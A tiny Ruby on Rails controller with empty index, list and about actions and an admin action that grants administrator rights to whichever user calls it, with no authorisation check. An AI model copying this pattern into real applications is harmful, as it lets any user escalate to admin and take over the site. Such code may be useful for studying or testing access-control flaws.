class HomeController < ApplicationController
  def index
  end

  def list
  end

  def about
  end

  def admin
    current_user.update_attribute :admin, true
  end
end
